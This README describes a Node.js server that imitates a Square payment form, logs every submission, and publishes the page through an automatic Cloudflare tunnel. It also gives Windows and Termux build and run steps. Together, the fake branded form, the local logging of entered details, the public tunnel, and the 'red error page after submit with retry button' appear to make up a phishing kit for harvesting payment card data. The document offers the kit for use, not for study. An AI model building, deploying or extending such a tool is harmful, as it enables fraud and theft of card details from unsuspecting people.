# Square Payment Portal Server

This project is a Node.js version of the original Go server. It serves a Square-style payment form, logs incoming requests and submissions, and starts a Cloudflare tunnel so the app can be exposed publicly.

## Features

- Local HTTP server on port 5000
- Square-inspired payment form UI
- Form submission logging
- Cloudflare tunnel support via `cloudflared`
- Standalone Windows executable build using `pkg`
- Red error page after submit with retry button

## Project files

- `server.js` – main Node.js server
- `template.html` – payment form HTML
- `package.json` – project config and build script
- `dist/square-server.exe` – packaged Windows binary

## Requirements

### Windows

- Node.js 18+
- npm
- `cloudflared` installed and available in PATH for tunnel mode

### Termux (Android)

- Termux app installed
- `nodejs` and `npm` installed
- `cloudflared` installed

Install on Termux:

```bash
pkg update
pkg install nodejs npm git curl
```

Install Cloudflare tunnel client:

```bash
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -o /data/data/com.termux/files/usr/bin/cloudflared
chmod +x /data/data/com.termux/files/usr/bin/cloudflared
```

## Install dependencies

From the project folder:

```powershell
npm install
```

On Termux:

```bash
npm install
```

## Run the app directly

```powershell
node server.js
```

On Termux:

```bash
node server.js
```

Then open:

```text
http://localhost:5000
```

## Build the standalone Windows binary

```powershell
npm run build
```

This creates:

```text
dist/square-server.exe
```

## Build a Linux/Termux-compatible binary

On Linux or Termux, if you want a native binary for that environment, build for the matching target. Example for Linux x64:

```bash
npx pkg . --targets node18-linux-x64 --output dist/square-server
```

For Termux on ARM64, use the matching target if supported by your environment. If not, run the Node script directly instead.

## Run the packaged binary

Windows:

```powershell
cd dist
./square-server.exe
```

Linux/Termux:

```bash
cd dist
./square-server
```

## Cloudflare tunnel

The app automatically starts a Cloudflare tunnel using:

```powershell
cloudflared tunnel --url http://localhost:5000
```

On Termux:

```bash
cloudflared tunnel --url http://localhost:5000
```

If `cloudflared` is available, it prints a public URL in the console.

## Notes

- The app writes logs to a writable location instead of the packaged snapshot path, so the binary works correctly when launched from `dist`.
- If port 5000 is already in use, the app attempts to find an available port automatically.
- Form submissions are logged locally for inspection.

## Useful commands

Start the app:

```powershell
node server.js
```

Build the binary:

```powershell
npm run build
```

Check GitHub CLI auth:

```powershell
gh auth status
```

Login to GitHub:

```powershell
gh auth login
```

## GitHub push example

```powershell
git init
git add .
git commit -m "Convert Go server to Node.js"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git
git push -u origin main
```
